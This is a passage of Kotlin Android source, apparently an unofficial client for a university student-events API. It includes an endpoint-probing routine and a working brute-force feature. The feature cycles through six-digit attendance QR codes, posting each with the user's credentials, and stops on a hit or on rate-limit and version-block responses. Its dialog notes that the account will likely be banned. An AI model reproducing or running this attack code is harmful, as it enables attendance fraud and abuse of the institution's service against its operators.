                    if (!ok) { uploadResult.text = "❌ Upload lỗi\n$resp"; return@runOnUiThread }
                    val fileId = extractFileId(resp)
                    if (fileId.isNotBlank()) session.lastUploadedFileId = fileId
                    uploadResult.text = "✅ Upload OK" +
                        (if (fileId.isNotBlank()) " (fileId=$fileId)" else "") +
                        "\n$resp"
                }
            }
        } catch (e: Exception) { uploadResult.text = "Lỗi: ${e.message}" }
    }

    // ========== PROBE ==========
    private fun probeEndpoints() {
        val log = StringBuilder()
        log.append("=== PROBE API ENDPOINTS ===\n")
        log.append("Version: $appVersionName / $appVersionCode\n")
        log.append("Partition: ${session.partitionCode.ifBlank { "(empty)" }}\n\n")

        val endpoints = listOf(
            "GET" to "/slink/sv-su-kien/me/page?page=1&limit=1",
            "GET" to "/slink/sv-su-kien/me?page=1&limit=1",
            "GET" to "/slink/su-kien/user/from?page=1&limit=20",
            "GET" to "/slink/su-kien/me?page=1&limit=20"
        )

        probeNext(endpoints, 0, log, status)
    }

    private fun probeNext(
        endpoints: List<Pair<String, String>>,
        idx: Int,
        log: StringBuilder,
        statusView: TextView
    ) {
        if (idx >= endpoints.size) {
            runOnUiThread {
                log.append("\n=== DONE ===\n")
                statusView.text = log.toString()
            }
            return
        }
        val (method, path) = endpoints[idx]
        val url = Config.API_URL.trimEnd('/') + "/" + path.trimStart('/')
        val tag = "[${idx + 1}/${endpoints.size}] $method $path"

        Log.d(TAG_PROBE, "→ $tag (v$appVersionCode)")
        runOnUiThread {
            log.append("⏳ $tag\n")
            statusView.text = log.toString()
        }

        val cb: (Boolean, String) -> Unit = { ok, resp ->
            val preview = resp.take(1500)
            Log.d(TAG_PROBE, "← $tag ok=$ok resp=${resp.take(500)}")
            runOnUiThread {
                log.append("────────────────────\n")
                log.append("$tag\n")
                log.append("ok=$ok\n")
                if (isVersionBlocked(resp)) {
                    log.append("⚠️ VERSION BLOCKED\n")
                }
                log.append("resp:\n$preview\n\n")
                statusView.text = log.toString()
            }
            probeNext(endpoints, idx + 1, log, statusView)
        }

        if (method == "GET") Api.get(url, authHeaders(), cb)
        else Api.postJson(url, "{}", authHeaders(), cb)
    }

    // ========== BRUTEFORCE ==========
    private fun showBruteforceDialog() {
        if (bruteThread?.isAlive == true) {
            AlertDialog.Builder(this)
                .setTitle("Bruteforce đang chạy")
                .setMessage("Bạn muốn dừng?")
                .setPositiveButton("Dừng") { _, _ ->
                    bruteCancel = true
                    status.text = "Đã yêu cầu dừng bruteforce…"
                }
                .setNegativeButton("Tiếp tục", null)
                .show()
            return
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 16, 48, 0)
        }
        val startIn = EditText(this).apply {
            hint = "Từ (mặc định 150000)"; inputType = InputType.TYPE_CLASS_NUMBER
        }
        val endIn = EditText(this).apply {
            hint = "Đến (mặc định 160000)"; inputType = InputType.TYPE_CLASS_NUMBER
        }
        val delayIn = EditText(this).apply {
            hint = "Delay ms (mặc định 100 = ~10 req/s)"
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        container.addView(startIn)
        container.addView(endIn)
        container.addView(delayIn)
        container.addView(TextView(this).apply {
            text = "⚠️ Bruteforce 1M mã sẽ mất hàng giờ và gần như chắc chắn bị ban tài khoản.\n" +
                   "Khuyến nghị: chạy range hẹp 150000-160000 trước (10K mã, ~17 phút ở 100ms)."
            textSize = 11f
            setPadding(0, 16, 0, 0)
        })

        AlertDialog.Builder(this)
            .setTitle("Bruteforce mã điểm danh")
            .setView(container)
            .setPositiveButton("Chạy") { _, _ ->
                val start = startIn.text.toString().trim().toIntOrNull() ?: 150000
                val end = endIn.text.toString().trim().toIntOrNull() ?: 160000
                val delay = delayIn.text.toString().trim().toLongOrNull() ?: 100L
                if (start < 0 || end > 999999 || start > end) {
                    status.text = "Range không hợp lệ (0–999999, start ≤ end)"
                    return@setPositiveButton
                }
                startBruteforce(start, end, delay)
            }
            .setNegativeButton("Huỷ", null)
            .show()
    }

    private fun startBruteforce(start: Int, end: Int, delayMs: Long) {
        bruteCancel = false
        val total = end - start + 1
        status.text = "Bruteforce $start..$end ($total mã), delay ${delayMs}ms"

        val t = Thread {
            var tried = 0
            var i = start
            while (i <= end && !bruteCancel) {
                val ma = i.toString().padStart(6, '0')
                val latch = java.util.concurrent.CountDownLatch(1)
                var success = false
                var respCopy = "TIMEOUT"

                postWithAuth(
                    "/slink/sv-su-kien/qr",
                    JSONObject().put("ma", ma).put("loaiQR", "Tham gia").toString()
                ) { ok, resp ->
                    success = ok
                    respCopy = resp
                    latch.countDown()
                }

                latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
                tried++

                val finalMa = ma
                val finalSuccess = success
                val finalResp = respCopy
                val finalTried = tried
                runOnUiThread {
                    status.text = "[$finalTried/$total] ma=$finalMa\n" +
                        if (finalSuccess) "🎯 SUCCESS: ${finalResp.take(300)}"
                        else "resp: ${finalResp.take(150)}"
                }

                if (success && finalResp.contains("\"success\":true")) {
                    runOnUiThread { status.text = "🎯 Tìm thấy ma=$finalMa\n$finalResp" }
                    return@Thread
                }
                if (isVersionBlocked(finalResp)) {
                    runOnUiThread {
                        status.text = "⚠️ Version blocked tại ma=$finalMa\n$finalResp"
                    }
                    return@Thread
                }
                if (finalResp.contains("429") || finalResp.contains("Too Many", true) ||
                    finalResp.contains("rate limit", true)) {
                    runOnUiThread { status.text = "⚠️ Rate limit tại ma=$finalMa\nĐã dừng." }
                    return@Thread
                }

                try { Thread.sleep(delayMs) } catch (_: InterruptedException) { return@Thread }
                i++
            }

            runOnUiThread {
                status.text = if (bruteCancel) "Đã dừng bruteforce (thử $tried mã)"
                              else "Hoàn tất (thử $tried mã, không tìm thấy)"
            }
        }
        bruteThread = t
        t.start()
    }
}
